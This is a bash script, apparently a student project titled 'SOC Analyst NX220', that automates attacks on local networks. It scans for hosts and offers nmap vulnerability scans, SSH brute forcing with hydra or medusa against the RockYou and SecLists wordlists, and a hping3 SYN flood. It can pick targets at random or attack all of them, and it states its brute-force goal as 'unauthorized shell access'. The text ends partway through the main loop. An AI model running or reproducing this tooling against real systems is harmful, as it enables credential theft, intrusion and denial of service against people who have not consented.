#!/bin/bash

# ==============================================================================
# SCRIPT CONFIGURATION & COLORS (Theme: Neon Operator)
# ==============================================================================
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
GRAY='\033[1;30m'
NC='\033[0m' # No Color

# Base Log Directory
BASE_LOG_DIR="/var/log/NX220"
SCAN_RESULT="/tmp/network_hosts.txt"

# Global Config Variables
GLOBAL_SCAN_TYPE=""
GLOBAL_BRUTE_TOOL=""
GLOBAL_USER_LIST=""
GLOBAL_PASS_LIST=""

# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${RED}[!] Error: This script requires root privileges.${NC}"
        exit 1
    fi
}

show_banner() {
    clear
    echo -e "${CYAN}"
    figlet -f slant "SOC Analyst" 2>/dev/null || figlet "SOC Analyst"
    figlet -f slant "     NX220" 2>/dev/null || figlet "     NX220"
    echo -e "${GRAY}                                    Created by Oz Itzkowitz${NC}"
    echo -e "${GRAY}#: S10${NC}"
    echo -e "${GRAY}Class: 77367${NC}"
    echo -e "${GRAY}Teacher: Erel Regev${NC}"
    echo -e "${GRAY}                                                    ${NC}"
    echo -e "${BLUE}_____________________________________________________________${NC}"
    echo -e "  ${GRAY}[+]${NC} Network Discovery   ${GRAY}::${NC} Nmap"
    echo -e "  ${GRAY}[+]${NC} Vuln Scanning       ${GRAY}::${NC} Nmap & Masscan"
    echo -e "  ${GRAY}[+]${NC} Brute Forcing       ${GRAY}::${NC} Hydra & Medusa"
    echo -e "  ${GRAY}[+]${NC} Stress Testing      ${GRAY}::${NC} Hping3 SYN Flood"
    echo -e "${BLUE}_____________________________________________________________${NC}"
    echo -e ""
}
check_dependencies() {
    echo -e "${YELLOW}--- Checking System Dependencies ---${NC}"
    REQUIRED_TOOLS=("nmap" "hydra" "medusa" "hping3" "git" "masscan" "figlet" "bc")
    apt_updated=false
    missing_counter=0

    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}[!] $tool is MISSING.${NC}"
            missing_counter=$((missing_counter + 1))
            
            if [ "$apt_updated" = false ]; then
                echo -e "${BLUE}[+] Updating package lists...${NC}"
                apt-get update -y > /dev/null 2>&1
                apt_updated=true
            fi
            
            echo -e "${BLUE}[+] Installing $tool...${NC}"
            apt-get install -y "$tool" > /dev/null 2>&1
            
            if ! command -v "$tool" &> /dev/null; then
                echo -e "${RED}[!] Failed to install $tool. Manual intervention required.${NC}"
                exit 1
            else
                echo -e "${GREEN}[✓] $tool successfully installed.${NC}"
            fi
        else
            echo -e "${GREEN}[✓] $tool is already installed.${NC}"
        fi
    done

    echo -e "\n${GREEN}[✓] All dependencies met. Starting NX220 Framework...${NC}"
    sleep 5
}

check_wordlists() {
    ROCKYOU_DIR="/usr/share/wordlists"
    if [[ -f "$ROCKYOU_DIR/rockyou.txt.gz" ]] && [[ ! -f "$ROCKYOU_DIR/rockyou.txt" ]]; then
        echo -e "${BLUE}[+] Unzipping RockYou...${NC}"
        gzip -d "$ROCKYOU_DIR/rockyou.txt.gz"
    fi

    SECLISTS_DIR="/usr/share/seclists"
    if [[ ! -d "$SECLISTS_DIR" ]]; then
        echo -e "${BLUE}[+] Cloning SecLists...${NC}"
        mkdir -p "$SECLISTS_DIR"
        git clone https://github.com/danielmiessler/SecLists.git "$SECLISTS_DIR"
    fi
}

setup_session() {
    echo -e "${YELLOW}--- Session Configuration ---${NC}"
    echo -e "${CYAN}[?] Enter a Session Name (e.g., Client_A):${NC}"
    read -p "> " SESSION_NAME
    
    if [[ -z "$SESSION_NAME" ]]; then
        SESSION_NAME="Session_$(date +%Y%m%d_%H%M%S)"
    fi

    SESSION_DIR="$BASE_LOG_DIR/$SESSION_NAME"
    mkdir -p "$SESSION_DIR/scans"
    mkdir -p "$SESSION_DIR/brute_force"
    mkdir -p "$SESSION_DIR/stress_tests"
    
    SESSION_LOG="$SESSION_DIR/audit_summary.log"
    
    echo "===============================================================" > "$SESSION_LOG"
    echo " NX220 SECURITY AUDIT LOG" >> "$SESSION_LOG"
    echo " Session: $SESSION_NAME" >> "$SESSION_LOG"
    echo " Start Time: $(date)" >> "$SESSION_LOG"
    echo "===============================================================" >> "$SESSION_LOG"
    
    echo -e "${GREEN}[✓] Session initialized: $SESSION_DIR${NC}"
}

get_duration() {
    local start=$1
    local end=$2
    local diff=$((end - start))
    local min=$((diff / 60))
    local sec=$((diff % 60))
    printf "%02dm %02ds" $min $sec
}

log_full_action() {
    local action=$1
    local details=$2
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    echo "[$timestamp] $action | $details" >> "$SESSION_LOG"
}

write_tool_log_header() {
    local file_path=$1
    local tool_name=$2
    local target_ip=$3
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    
    echo "---------------------------------------------------------------" > "$file_path"
    echo "TOOL EXECUTION RECORD" >> "$file_path"
    echo "Start Time : $timestamp" >> "$file_path"
    echo "Tool Name  : $tool_name" >> "$file_path"
    echo "Target IP  : $target_ip" >> "$file_path"
    echo "---------------------------------------------------------------" >> "$file_path"
    echo "RAW OUTPUT START:" >> "$file_path"
    echo "" >> "$file_path"
}

# VISUALIZATION ENGINE
track_process() {
    local pid=$1
    local text=$2
    local spin='|/-\'
    local elapsed=0
    local start_time=$(date +%s)
    
    tput civis >&2 # Hide cursor (stderr)
    
    while kill -0 "$pid" 2>/dev/null; do
        local temp=${spin#?}
        local spin=$temp${spin%"$temp"}
        
        local current_time=$(date +%s)
        elapsed=$((current_time - start_time))
        
        # FIX: Redirect printf to Stderr (>&2)
        printf "\r${CYAN}[%c]${NC} ${YELLOW}%s${NC} ${GRAY}(%ds)${NC}" "$spin" "$text" "$elapsed" >&2
        sleep 0.1
    done
    
    tput cnorm >&2 # Show cursor (stderr)
    # FIX: Redirect echo to Stderr (>&2)
    echo -e "\r${GREEN}[✓] ${text} Complete. (Total: ${elapsed}s)          ${NC}" >&2
}

draw_progress_bar() {
    local duration=$1
    local text=$2
    local cols=$(tput cols)
    local bar_size=$((cols - 25))
    if [[ $bar_size -lt 10 ]]; then bar_size=10; fi

    tput civis >&2
    for ((i=0; i<=duration; i++)); do
        local pct=$(( i * 100 / duration ))
        local filled=$(( i * bar_size / duration ))
        local unfilled=$(( bar_size - filled ))
        
        local bar=""
        for ((j=0; j<filled; j++)); do bar="${bar}#"; done
        for ((j=0; j<unfilled; j++)); do bar="${bar}-"; done
        
        # FIX: Redirect printf to Stderr (>&2)
        printf "\r${BLUE}[${bar}]${NC} ${GREEN}%d%%${NC} ${GRAY}%s${NC}" "$pct" "$text" >&2
        sleep 1
    done
    tput cnorm >&2
    echo "" >&2
}

# --- UPDATED CLEANUP FUNCTION ---
cleanup_and_exit() {
    echo -e "\n${YELLOW}--- Session Wrap-up ---${NC}"
    log_full_action "SESSION END" "User initiated exit sequence. End Time: $(date)"
    
    echo -e "${GRAY}Session stored at: $SESSION_DIR${NC}"
    echo -e "${YELLOW}[?] Choose exit action:${NC}"
    echo -e "1) Save Session Logs & Artifacts   ${GREEN}(Recommended)${NC}"
    echo -e "2) Delete ALL Data & Exit          ${RED}(Wipes Everything)${NC}"
    echo -e "3) Keep Everything in /tmp         ${GRAY}(Debug Mode)${NC}"
    read -p "> " exit_choice

    case $exit_choice in
        1)
            echo -e "${BLUE}[+] Consolidating logs and cleaning temporary logic files...${NC}"
            
            # Move the discovery list to the session folder so it is saved
            if [[ -f "$SCAN_RESULT" ]]; then
                mv "$SCAN_RESULT" "$SESSION_DIR/discovered_hosts.txt"
            fi
            
            # Remove ONLY useless logic files (port lists, sanitized list copies)
            rm -f /tmp/ports_* /tmp/clean_* /tmp/masscan_raw.txt /tmp/users.txt /tmp/pass.txt
            
            echo -e "${GREEN}[✓] Session artifacts saved to: $SESSION_DIR${NC}"
            echo -e "${GREEN}[✓] Scratchpad files removed.${NC}"
            ;;
        2)
            echo -e "${RED}[!] Wiping session data and temp files...${NC}"
            rm -f "$SCAN_RESULT" /tmp/nmap_scan_* /tmp/users.txt /tmp/pass.txt /tmp/masscan_raw.txt /tmp/scan_* /tmp/clean_* /tmp/ports_*
            if [[ -n "$SESSION_DIR" ]] && [[ "$SESSION_DIR" != "/" ]]; then
                rm -rf "$SESSION_DIR"
            fi
            echo -e "${GREEN}[✓] All data deleted.${NC}"
            ;;
        3)
            echo -e "${CYAN}[*] Preserving all files (temp + logs) for debugging.${NC}"
            ;;
        *)
            # Default to Option 1 behavior if invalid input
            if [[ -f "$SCAN_RESULT" ]]; then mv "$SCAN_RESULT" "$SESSION_DIR/discovered_hosts.txt"; fi
            rm -f /tmp/ports_* /tmp/clean_* /tmp/masscan_raw.txt /tmp/users.txt /tmp/pass.txt
            echo -e "${GREEN}[✓] Logs Saved.${NC}"
            ;;
    esac
    echo -e "${GREEN}Exiting. Stay safe!${NC}"
    exit 0
}

# ==============================================================================
# SECTION 1: CONFIGURATION FUNCTIONS
# ==============================================================================

setup_vuln_scan_config() {
    if [[ "$RUN_ALL_MODE" == "true" ]]; then
        GLOBAL_SCAN_TYPE=5
        echo -e "${CYAN}[*] Batch Mode: Configured for ALL Scans.${NC}"
    elif [[ "$IS_RANDOM_MODE" == "true" ]]; then
        GLOBAL_SCAN_TYPE=$((1 + RANDOM % 4))
        echo -e "\n${CYAN}[*] Random Mode: Auto-selected Scan Type #$GLOBAL_SCAN_TYPE${NC}"
    else
        echo -e "\n${YELLOW}--- Vulnerability Scan Configuration ---${NC}"
        echo -e "${GRAY}1)${NC} Nmap Fast  ${GRAY}(TCP Top 100)${NC}"
        echo -e "${GRAY}2)${NC} Nmap Full  ${GRAY}(TCP All Ports + OS)${NC}"
        echo -e "${GRAY}3)${NC} Nmap Vuln  ${GRAY}(TCP CVE Scripts)${NC}"
        echo -e "${GRAY}4)${NC} Masscan    ${GRAY}(UDP All Ports)${NC}"
        echo -e "${GRAY}5)${NC} Run ALL    ${GRAY}(Smart Sequence)${NC}"
        echo -e "${GRAY}R)${NC} Random     ${GRAY}(Pick 1-4)${NC}"
        echo -e "${RED}B) Back        ${GRAY}(Return to Menu)${NC}"
        echo -e "${YELLOW}[?] Choose Scan Type:${NC}"
        read -p "> " scan_choice

        if [[ "${scan_choice^^}" == "B" ]]; then return 99; fi

        if [[ "${scan_choice^^}" == "R" ]]; then
            GLOBAL_SCAN_TYPE=$((1 + RANDOM % 4))
            echo -e "${CYAN}[*] Randomly selected: Option $GLOBAL_SCAN_TYPE${NC}"
        else
            GLOBAL_SCAN_TYPE=$scan_choice
        fi
    fi
}

setup_brute_force_config() {
    check_wordlists
    echo -e "\n${YELLOW}--- SSH Brute Force Configuration ---${NC}"

    local d_user="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
    if [[ ! -f "$d_user" ]]; then d_user="/usr/share/wordlists/metasploit/unix_users.txt"; fi
    local d_pass="/usr/share/wordlists/rockyou.txt"

    if [[ "$RUN_ALL_MODE" == "true" ]]; then
        echo -e "${CYAN}[!] Batch Mode Active: Please configure your Brute Force settings below.${NC}"
    fi

    if [[ "$IS_RANDOM_MODE" == "true" ]]; then
        echo -e "${CYAN}[*] Random Mode detected, but configuration required.${NC}"
    fi

    get_valid_file() {
        local prompt_msg=$1
        local default_val=$2
        while true; do
            echo -e "${CYAN}[?] $prompt_msg${NC}" >&2
            read -e -p "> " input_path
            input_path="${input_path/#\~/$HOME}"
            if [[ -z "$input_path" ]]; then
                if [[ -f "$default_val" ]]; then
                    echo "$default_val"
                    return
                else
                    echo -e "${RED}[!] Default missing.${NC}" >&2
                fi
            elif [[ -f "$input_path" ]]; then
                echo "$input_path"
                return
            else
                echo -e "${RED}[!] File not found.${NC}" >&2
            fi
        done
    }

    echo -e "\n${YELLOW}--- Select Brute Force Strategy ---${NC}"
    echo -e "${GRAY}1)${NC} Select User List  + Select Pass List"
    echo -e "${GRAY}2)${NC} Input Single User + Input Single Pass"
    echo -e "${GRAY}3)${NC} Input Single User + Select Pass List"
    echo -e "${GRAY}4)${NC} Select User List  + Input Single Pass"
    echo -e "${GRAY}5)${NC} Run Defaults      + (SecLists & RockYou)"
    echo -e "${RED}B) Back               ${GRAY}(Return to Menu)${NC}"
    echo -e "${YELLOW}[?] Select Mode (Default: 5):${NC}"
    read -p "> " mode_choice
    
    if [[ "${mode_choice^^}" == "B" ]]; then return 99; fi
    if [[ -z "$mode_choice" ]]; then mode_choice=5; fi

    case $mode_choice in
        1)
            GLOBAL_USER_LIST=$(get_valid_file "Path to User List:" "$d_user")
            GLOBAL_PASS_LIST=$(get_valid_file "Path to Password List:" "$d_pass")
            ;;
        2)
            read -p "Enter Username: " single_user
            read -p "Enter Password: " single_pass
            echo "$single_user" > /tmp/users.txt
            echo "$single_pass" > /tmp/pass.txt
            GLOBAL_USER_LIST="/tmp/users.txt"
            GLOBAL_PASS_LIST="/tmp/pass.txt"
            ;;
        3)
            read -p "Enter Username: " single_user
            echo "$single_user" > /tmp/users.txt
            GLOBAL_USER_LIST="/tmp/users.txt"
            GLOBAL_PASS_LIST=$(get_valid_file "Path to Password List:" "$d_pass")
            ;;
        4)
            GLOBAL_USER_LIST=$(get_valid_file "Path to User List:" "$d_user")
            read -p "Enter Password: " single_pass
            echo "$single_pass" > /tmp/pass.txt
            GLOBAL_PASS_LIST="/tmp/pass.txt"
            ;;
        5)
            echo -e "${CYAN}[*] Applying Default Wordlists.${NC}"
            GLOBAL_USER_LIST="$d_user"
            GLOBAL_PASS_LIST="$d_pass"
            ;;
        *)
            echo -e "${RED}[!] Invalid mode. Applying Defaults.${NC}"
            GLOBAL_USER_LIST="$d_user"
            GLOBAL_PASS_LIST="$d_pass"
            ;;
    esac
    
    if [[ "$IS_RANDOM_MODE" == "true" ]]; then
        GLOBAL_BRUTE_TOOL=$((1 + RANDOM % 2))
        local tname="Hydra"
        if [[ "$GLOBAL_BRUTE_TOOL" == "2" ]]; then tname="Medusa"; fi
        echo -e "${CYAN}[*] Random Mode: Auto-selected Engine: $tname${NC}"
    else
        echo -e "\n${YELLOW}[?] Select Engine (Default: 1):${NC}"
        echo -e "${GRAY}1)${NC} Hydra"
        echo -e "${GRAY}2)${NC} Medusa"
        read -p "> " tool_choice
        if [[ -z "$tool_choice" ]]; then tool_choice=1; fi
        GLOBAL_BRUTE_TOOL=$tool_choice
    fi
}

# ==============================================================================
# SECTION 2: EXECUTION FUNCTIONS
# ==============================================================================
execute_vuln_scan() {
    local target=$1
    local start_sec=$(date +%s)
    local start_str=$(date)
    local log_prefix="$SESSION_DIR/scans/${target//./_}"
    
    log_full_action "ATTACK START" "Vuln Scan | Target: $target | Type: $GLOBAL_SCAN_TYPE | Start: $start_str"

    # --- Helper to extract ports ---
    get_open_ports() {
        local port_file="/tmp/ports_$target.tmp"
        
        echo -e "${CYAN}[*] Phase 1: Fast Port Discovery (1-65535)...${NC}" >&2
        
        # Run Scan
        nmap -p- --min-rate=1000 -T4 -Pn "$target" -oG "$port_file" > /dev/null 2>&1 &
        track_process $! "Identifying Open Ports"
        
        # Extract Clean Ports
        local ports=$(grep -oP '\d+(?=/open)' "$port_file" | tr '\n' ',' | sed 's/,$//' | tr -cd '0-9,')
        rm -f "$port_file"
        
        # Verify ports exist
        if [[ -n "$ports" ]]; then
            # Pretty print to Screen (Stderr)
            echo -e "\n${GREEN}[+] Found Open Ports on $target:${NC}" >&2
            IFS=',' read -ra PORT_ARRAY <<< "$ports"
            for port in "${PORT_ARRAY[@]}"; do
                echo -e "    ${CYAN}> Port ${port}/tcp${NC}" >&2
            done
            echo "" >&2
            
            # OUTPUT ONLY RAW PORTS TO STDOUT (Variable Capture)
            echo "$ports"
        fi
    }

    run_specific_scan() {
        case $1 in
            1) 
                local outfile="${log_prefix}_fast.txt"
                write_tool_log_header "$outfile" "Nmap Fast Scan (-F)" "$target"
                nmap -F "$target" -oN - >> "$outfile" &
                track_process $! "Nmap Fast Scan" ;;
            2) 
                local outfile="${log_prefix}_full.txt"
                # Capture ports from helper
                local open_ports=$(get_open_ports)
                
                if [[ -z "$open_ports" ]]; then
                    echo -e "${RED}[!] No open ports. Skipping Deep Scan.${NC}" >&2
                else
                    echo -e "${BLUE}[+] Phase 2: Running Deep Scan (-A) on found ports...${NC}" >&2
                    write_tool_log_header "$outfile" "Nmap Deep Scan (-A -p $open_ports)" "$target"
                    nmap -sS -Pn -A -p "$open_ports" "$target" -oN - >> "$outfile" 2>&1 &
                    track_process $! "Phase 2: Deep Scan"
                fi ;;
            3) 
                local outfile="${log_prefix}_vuln.txt"
                local open_ports=$(get_open_ports)
                
                if [[ -z "$open_ports" ]]; then
                    echo -e "${RED}[!] No open ports. Skipping Vuln Scan.${NC}" >&2
                else
                    echo -e "${BLUE}[+] Phase 2: Running Vuln Scripts on found ports...${NC}" >&2
                    write_tool_log_header "$outfile" "Nmap Vuln Scan (--script=vuln)" "$target"
                    nmap -Pn --script vuln -p "$open_ports" "$target" -oN - >> "$outfile" 2>&1 &
                    track_process $! "Phase 2: CVE Scripting"
                fi ;;
            4)
                local iface=$(ip route | awk '/default/ {print $5}' | head -n1)
                local outfile="${log_prefix}_udp.txt"
                write_tool_log_header "$outfile" "Masscan UDP Scan" "$target"
                echo -e "${BLUE}[+] Launching Masscan UDP on $iface...${NC}" >&2
                masscan -pU:1-65535 "$target" -e "$iface" --rate=1000 >> "$outfile" 2>&1 &
                track_process $! "Masscan UDP Flood" ;;
        esac
    }

    if [[ "$GLOBAL_SCAN_TYPE" == "5" ]]; then
        echo -e "${CYAN}[*] Executing Smart Sequence (Deep -> Vuln -> UDP)...${NC}" >&2
        run_specific_scan 2
        run_specific_scan 3
        run_specific_scan 4
    elif [[ "$GLOBAL_SCAN_TYPE" =~ ^[1-4]$ ]]; then
        run_specific_scan "$GLOBAL_SCAN_TYPE"
    else
        echo -e "${RED}[!] Invalid scan configuration.${NC}" >&2; return 1
    fi
    
    local end_sec=$(date +%s)
    local duration=$(get_duration $start_sec $end_sec)
    log_full_action "ATTACK END" "Vuln Scan Finished | Target: $target | Duration: $duration"
    echo -e "${GREEN}[✓] Scan results saved.${NC}" >&2
}

execute_ssh_brute() {
    local target=$1
    local start_sec=$(date +%s)
    local start_str=$(date)
    local log_file="$SESSION_DIR/brute_force/${target//./_}_creds.txt"
    
    echo -e "${BLUE}[*] Verifying connectivity to $target:22...${NC}"
    if ! nc -z -w 2 "$target" 22; then
        echo -e "${RED}[!] ERROR: Port 22 is CLOSED on $target.${NC}"
        log_full_action "ATTACK SKIPPED" "Port 22 closed on $target"
        return
    fi

    cp "$GLOBAL_USER_LIST" /tmp/clean_users.txt
    cp "$GLOBAL_PASS_LIST" /tmp/clean_pass.txt
    sed -i 's/\r$//' /tmp/clean_users.txt
    sed -i 's/\r$//' /tmp/clean_pass.txt
    
    USE_USERS="/tmp/clean_users.txt"
    USE_PASS="/tmp/clean_pass.txt"

    log_full_action "ATTACK START" "Brute Force | Target: $target | Start: $start_str"
    
    if [[ "$GLOBAL_BRUTE_TOOL" == "1" ]]; then
        echo -e "${BLUE}[+] Launching Hydra (Safe Mode)...${NC}"
        write_tool_log_header "$log_file" "Hydra SSH Brute" "$target"
        
        hydra -I -L $USE_USERS -P $USE_PASS ssh://$target -t 1 -w 2 -f -V >> "$log_file" 2>&1 &
        track_process $! "Hydra Cracking"
        
        if grep -q "login:" "$log_file" && grep -q "password:" "$log_file"; then
            echo -e "\n${RED}[!!!] PWNED: CREDENTIALS FOUND [!!!]${NC}"
            grep "login:" "$log_file" | grep "password:" --color=always
            log_full_action "ATTACK SUCCESS" "Hydra found credentials."
        else
            echo -e "${YELLOW}[-] No credentials found.${NC}"
        fi
        
    elif [[ "$GLOBAL_BRUTE_TOOL" == "2" ]]; then
        echo -e "${BLUE}[+] Launching Medusa...${NC}"
        write_tool_log_header "$log_file" "Medusa SSH Brute" "$target"
        
        medusa -h "$target" -U $USE_USERS -P $USE_PASS -M ssh -t 1 -r 1 -f -v 4 >> "$log_file" 2>&1 &
        track_process $! "Medusa Cracking"
        
        if grep -q "ACCOUNT FOUND" "$log_file"; then
            echo -e "\n${RED}[!!!] PWNED: CREDENTIALS FOUND [!!!]${NC}"
            grep "ACCOUNT FOUND" "$log_file" --color=always
            log_full_action "ATTACK SUCCESS" "Medusa found credentials."
        else
            echo -e "${YELLOW}[-] No credentials found.${NC}"
        fi
    fi

    local end_sec=$(date +%s)
    local duration=$(get_duration $start_sec $end_sec)
    log_full_action "ATTACK END" "Brute Force Finished | Target: $target | Duration: $duration"
    
    rm -f /tmp/clean_users.txt /tmp/clean_pass.txt
}

execute_stress_test() {
    local target=$1
    local start_sec=$(date +%s)
    local start_str=$(date)
    
    echo -e "\n${YELLOW}--- TCP SYN Flood Stress Test ($target) ---${NC}"
    DURATION="10" 
    local log_file="$SESSION_DIR/stress_tests/${target//./_}_flood.log"
    
    log_full_action "ATTACK START" "Hping3 Flood | Target: $target | Duration: ${DURATION}s | Start: $start_str"
    write_tool_log_header "$log_file" "Hping3 SYN Flood" "$target"
    
    echo -e "${YELLOW}[!] Launching packet flood...${NC}"
    timeout "$DURATION" hping3 -S --flood -V -p 80 "$target" >> "$log_file" 2>&1 &
    draw_progress_bar "$DURATION" "Flooding Target..."
    
    local end_sec=$(date +%s)
    local real_duration=$(get_duration $start_sec $end_sec)
    
    log_full_action "ATTACK END" "Stress Test Finished | Target: $target | Actual Duration: $real_duration"
    echo -e "${GREEN}[✓] Stress test completed.${NC}"
}

# ==============================================================================
# SECTION 3: NETWORK DISCOVERY & SELECTION
# ==============================================================================

discover_network() {
    echo -e "${YELLOW}--- Network Interface Selection ---${NC}"
    available_ifaces=$(ip -o link show | awk -F': ' '{print $2}' | grep -v "lo")
    valid_ifaces=()
    valid_cidrs=()
    
    i=1
    for iface in $available_ifaces; do
        ip_info=$(ip -o -f inet addr show "$iface" 2>/dev/null | awk '{print $4}')
        if [[ -n "$ip_info" ]]; then
            echo -e "${GRAY}$i)${NC} $iface ${CYAN}($ip_info)${NC}"
            valid_ifaces+=("$iface")
            valid_cidrs+=("$ip_info")
            ((i++))
        fi
    done

    num_ifaces=${#valid_ifaces[@]}
    
    if [[ $num_ifaces -eq 0 ]]; then
        echo -e "${RED}[!] No active IPv4 interfaces found. Exiting.${NC}"; exit 1
    elif [[ $num_ifaces -eq 1 ]]; then
        iface=${valid_ifaces[0]}
        cidr=${valid_cidrs[0]}
        echo -e "${CYAN}[*] Auto-selected: $iface${NC}"
    else
        echo -e "${YELLOW}[?] Select Interface [1-$num_ifaces] (Default: 1):${NC}"
        read -p "> " iface_choice
        if [[ -z "$iface_choice" ]]; then iface_choice=1; fi
        if [[ "$iface_choice" =~ ^[0-9]+$ ]] && (( iface_choice >= 1 && iface_choice <= num_ifaces )); then
            index=$((iface_choice - 1))
            iface=${valid_ifaces[$index]}
            cidr=${valid_cidrs[$index]}
            echo -e "${CYAN}[*] Selected: $iface${NC}"
        else
            echo -e "${RED}[!] Invalid selection.${NC}"; exit 1
        fi
    fi

    local my_ip=$(echo "$cidr" | cut -d'/' -f1)
    echo -e "\n${YELLOW}--- Network Discovery ($iface) ---${NC}"
    local start_str=$(date)
    log_full_action "DISCOVERY START" "Scanning CIDR: $cidr | Start: $start_str"
    
    nmap -sn -n "$cidr" -oG - | awk '/Up$/{print $2}' | grep -v "$my_ip" > "$SCAN_RESULT" &
    track_process $! "Scanning Network"
    
    mapfile -t HOSTS < "$SCAN_RESULT"
    
    echo "---------------------------------------------------------------" >> "$SESSION_LOG"
    echo "DISCOVERED HOSTS ($cidr):" >> "$SESSION_LOG"
    cat "$SCAN_RESULT" >> "$SESSION_LOG"
    echo "---------------------------------------------------------------" >> "$SESSION_LOG"
    
    local end_str=$(date)
    log_full_action "DISCOVERY COMPLETE" "Found ${#HOSTS[@]} hosts | End: $end_str"

    if [[ ${#HOSTS[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No hosts found. Check your connection.${NC}"; exit 1
    fi
}

select_target() {
    echo -e "\n${GREEN}Available Targets:${NC}"
    local i=1
    for ip in "${HOSTS[@]}"; do
        echo -e "${GRAY}$i)${NC} $ip"
        ((i++))
    done

    echo -e "${GRAY}A)${NC} Scan ALL Targets"
    echo -e "${GRAY}R)${NC} Select RANDOM Target"
    echo -e "${RED}B) Rescan Network${NC}"

    TARGET_QUEUE=()

    echo -e "\n${YELLOW}--- Select Target ---${NC}"
    num_hosts=${#HOSTS[@]}
    echo -e "${YELLOW}[?] Enter choice [1-$num_hosts, A, R, B]:${NC}"
    read -p "> " target_choice

    if [[ "${target_choice^^}" == "B" ]]; then
        discover_network
        select_target
        return
    fi

    if [[ "${target_choice^^}" == "A" ]]; then
        TARGET_QUEUE=("${HOSTS[@]}")
        echo -e "${CYAN}[*] Selected ALL ${#TARGET_QUEUE[@]} hosts.${NC}"
        log_full_action "TARGET SELECTION" "User selected ALL available hosts."
    elif [[ "${target_choice^^}" == "R" ]]; then
        rand_index=$((RANDOM % num_hosts))
        TARGET_QUEUE+=("${HOSTS[$rand_index]}")
        echo -e "${CYAN}[*] Random Target Selected: ${TARGET_QUEUE[0]}${NC}"
        log_full_action "TARGET SELECTION" "Random target selected: ${TARGET_QUEUE[0]}"
    elif [[ "$target_choice" =~ ^[0-9]+$ ]] && (( target_choice >= 1 && target_choice <= num_hosts )); then
        index=$((target_choice - 1))
        TARGET_QUEUE+=("${HOSTS[$index]}")
        echo -e "${CYAN}[*] Target Selected: ${TARGET_QUEUE[0]}${NC}"
        log_full_action "TARGET SELECTION" "User selected target: ${TARGET_QUEUE[0]}"
    else
        echo -e "${RED}[!] Error: Invalid selection.${NC}"
        select_target
    fi
}

# ==============================================================================
# MAIN LOGIC
# ==============================================================================

trap cleanup_and_exit SIGINT

check_root
check_dependencies
show_banner
setup_session
discover_network
select_target

while true; do
    IS_RANDOM_MODE="false"
    RUN_ALL_MODE="false"
    SKIP_EXECUTION="false"

    if [[ ${#TARGET_QUEUE[@]} -gt 1 ]]; then
        echo -e "\n${YELLOW}--- Attack Vector Selection (Targets: ${#TARGET_QUEUE[@]}) ---${NC}"
    else
        echo -e "\n${YELLOW}--- Attack Vector Selection (${TARGET_QUEUE[0]}) ---${NC}"
    fi

    echo -e "${GRAY}1)${NC} Scan & Enumeration"
    echo -e "${GRAY}2)${NC} SSH Brute Force"
    echo -e "${GRAY}3)${NC} TCP SYN Flood (DoS)"
    echo -e "${GRAY}4)${NC} Run ALL Attacks (Sequential)"
    echo -e "${GRAY}R)${NC} Random Attack"
    echo -e "${RED}B) Back          ${GRAY}(Reselect Target)${NC}"
    echo -e "${RED}E) Exit Script${NC}"

    echo -e "${YELLOW}[?] Choose Option:${NC}"
    read -p "> " attack_choice

    if [[ "${attack_choice^^}" == "E" ]]; then cleanup_and_exit; fi

    if [[ "${attack_choice^^}" == "B" ]]; then
        select_target
        continue
    fi

    if [[ "${attack_choice^^}" == "R" ]]; then
        IS_RANDOM_MODE="true"
        attack_choice=$((1 + RANDOM % 3))
        echo -e "${CYAN}[*] Random Mode: Rolling... Got Option $attack_choice${NC}"
    fi

    if [[ "$attack_choice" == "4" ]]; then
        RUN_ALL_MODE="true"
        echo -e "${CYAN}[*] Batch Mode: Running ALL vectors sequentially...${NC}"
    elif [[ ! "$attack_choice" =~ ^[1-3]$ ]]; then
        echo -e "${RED}[!] Invalid input.${NC}"
        continue
    fi

    echo -e "\n${YELLOW}---------------------------------------------${NC}"
    echo -e "${GREEN}          ATTACK DESCRIPTION${NC}"
    echo -e "${YELLOW}---------------------------------------------${NC}"

    case $attack_choice in
        1) 
            echo -e "${CYAN}TYPE: Network Reconnaissance${NC}"
            echo -e "${BLUE}Goal: Gather intelligence via Two-Stage Scanning.${NC}\n"
            setup_vuln_scan_config 
            if [[ $? -eq 99 ]]; then SKIP_EXECUTION="true"; fi
            ;;
        2) 
            echo -e "${CYAN}TYPE: SSH Brute Forcing${NC}"
            echo -e "${BLUE}Goal: Gain unauthorized shell access.${NC}\n"
            setup_brute_force_config
            if [[ $? -eq 99 ]]; then SKIP_EXECUTION="true"; fi 
            ;;
        3) 
            echo -e "${CYAN}TYPE: DoS Stress Test${NC}"
            echo -e "${BLUE}Goal: Test system resilience.${NC}\n"
            ;;
        4)
            echo -e "${CYAN}TYPE: Full Audit (Batch)${NC}"
            echo -e "${BLUE}Goal: Perform complete assessment (Scan -> Brute -> DoS).${NC}\n"
            # Run Smart Scan setup
            setup_vuln_scan_config
            if [[ $? -eq 99 ]]; then SKIP_EXECUTION="true"; fi
            # Run Manual Brute Force Setup (Required per user request)
            setup_brute_force_config
            if [[ $? -eq 99 ]]; then SKIP_EXECUTION="true"; fi
            ;;
    esac

    if [[ "$SKIP_EXECUTION" == "true" ]]; then
        echo -e "${YELLOW}[*] Returning to Main Menu...${NC}"
        continue
    fi

    echo -e "\n${BLUE}=============================================${NC}"
    
    for target_ip in "${TARGET_QUEUE[@]}"; do
        echo -e "${YELLOW}>>> PROCESSING TARGET: $target_ip <<<${NC}"
        
        target_start_sec=$(date +%s)
        log_full_action "TARGET START" "Processing started for $target_ip"
        
        if [[ "$RUN_ALL_MODE" == "true" ]]; then
            execute_vuln_scan "$target_ip"
            execute_ssh_brute "$target_ip"
            execute_stress_test "$target_ip"
        else
            case $attack_choice in
                1) execute_vuln_scan "$target_ip" ;;
                2) execute_ssh_brute "$target_ip" ;;
                3) execute_stress_test "$target_ip" ;;
            esac
        fi
        
        target_end_sec=$(date +%s)
        target_duration=$(get_duration $target_start_sec $target_end_sec)
        
        echo -e "${GREEN}[✓] Finished with $target_ip (Time: $target_duration)${NC}\n"
